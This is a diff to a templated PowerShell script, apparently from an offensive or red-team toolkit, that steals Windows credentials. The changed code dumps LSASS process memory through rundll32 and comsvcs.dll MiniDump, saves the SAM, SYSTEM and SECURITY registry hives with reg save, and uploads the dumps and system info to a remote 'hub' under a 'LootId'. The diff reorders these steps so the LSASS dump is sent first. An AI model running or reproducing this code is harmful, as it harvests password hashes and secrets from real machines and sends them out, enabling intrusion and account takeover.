@@ -707,20 +707,23 @@ Partially based on:
     $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
 
     try {
-        {{'Write-Debug "Dumping Hives..."'|debug}}
-        & reg save HKLM\SAM $SamPath /y
-        & reg save HKLM\SYSTEM $SystemPath /y
-        & reg save HKLM\SECURITY $SecurityPath /y
-        & reg save HKLM\SOFTWARE $SoftwarePath /y
+        {{'Write-Debug "Dumping sysinfo..."'|debug}}
+        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
 
         {{'Write-Debug "Dumping lsass to $ProcessDumpPath..."'|debug}}
         & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $ProcessId $ProcessDumpPath full
         Wait-Process -Id (Get-Process rundll32).id
+        {{'Write-Debug "Sending lsass dump home..."'|debug}}
+        if (Test-Path $ProcessDumpPath) { PushTo-Hub -LootId $LootId $ProcessDumpPath }
 
-        {{'Write-Debug "Dumping sysinfo..."'|debug}}
-        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
-        {{'Write-Debug "Sending dumps home..."'|debug}}
-        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath, $ProcessDumpPath) {
+        {{'Write-Debug "Dumping Hives..."'|debug}}
+        & reg save HKLM\SAM $SamPath /y
+        & reg save HKLM\SYSTEM $SystemPath /y
+        & reg save HKLM\SECURITY $SecurityPath /y
+        # & reg save HKLM\SOFTWARE $SoftwarePath /y
+
+        {{'Write-Debug "Sending hive dumps home..."'|debug}}
+        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath ) {
             if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
         }
     } finally {
